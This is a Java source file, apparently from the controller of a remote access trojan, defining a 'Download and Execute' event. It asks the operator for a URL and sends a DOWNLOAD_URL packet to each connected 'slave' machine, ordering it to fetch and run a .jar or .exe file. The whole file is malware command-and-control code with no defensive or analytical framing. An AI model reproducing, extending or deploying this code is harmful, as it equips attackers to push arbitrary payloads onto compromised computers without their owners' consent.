package com.redpois0n.events;

import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

import com.redpois0n.Slave;
import com.redpois0n.packets.Header;
import com.redpois0n.packets.PacketBuilder;
import com.redpois0n.util.IconUtils;
import com.redpois0n.util.Util;


public class DownloadAndExecEvent extends Event {

	public ImageIcon icon = IconUtils.getIcon(getIcon());
	public String url;
	public boolean jar;

	public DownloadAndExecEvent(String name) {
		super(name);
	}

	public Object[] getDisplayData() {
		return new Object[] { icon, super.name, toString(), url, jar ? ".jar" : ".exe" };
	}

	public void perform(Slave slave) {
		slave.addToSendQueue(new PacketBuilder(Header.DOWNLOAD_URL, new String[] { url }));
	}

	public String toString() {
		return "Download and Execute";
	}

	public boolean add() {
		String result = Util.showDialog("Download URL", "Input URL to download and execute");
		if (result == null) {
			return false;
		}
		if (!result.startsWith("http://")) {
			JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
			return false;
		}
		jar = result.trim().endsWith(".jar");
		url = result.trim().replace(" ", "%20");
		return true;
	}

	public String getIcon() {
		return "down_arrow";
	}

}
